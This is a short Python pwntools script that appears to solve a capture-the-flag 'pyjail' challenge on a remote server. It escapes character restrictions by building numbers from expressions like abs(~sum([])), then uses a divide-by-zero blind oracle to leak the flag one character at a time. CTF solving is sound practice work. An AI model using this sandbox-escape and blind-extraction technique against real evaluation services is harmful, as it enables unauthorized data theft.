from pwn import *

"""
0 = sum([])
1 = abs(~sum([]))
-1 = ~sum([])

boolean-based blind using 1/(ord(_[0])-97). If "divided by zero" is returned, then the charcode is right.
"""

# initializations
ONE = "abs(~sum([]))+"
flag = "a"

# helper function
def send_code(code: str):
    p.sendline(code.encode())
    return p.recvuntil(b'Give code: ').decode().split("Give")[0]


# start connection and flush
p = remote('amt.rs', 31671)
p.sendline(b'_')
p.recvuntil(b'Give code: ')
p.recvuntil(b'Give code: ')


while '}' not in flag:
    current_index = len(flag)
    for i in range(0x20, 0x7e):
        payload = f'abs(~sum([]))/(ord(_[{(ONE*current_index)[:-1]}])-({(ONE*i)[:-1]}))'
        #print(payload)

        out = send_code(payload)

        if 'zero' in out:
            flag += chr(i)
            print(flag)
            break
        elif out == '':
            continue
        else:
            print(out)
            exit()

p.close()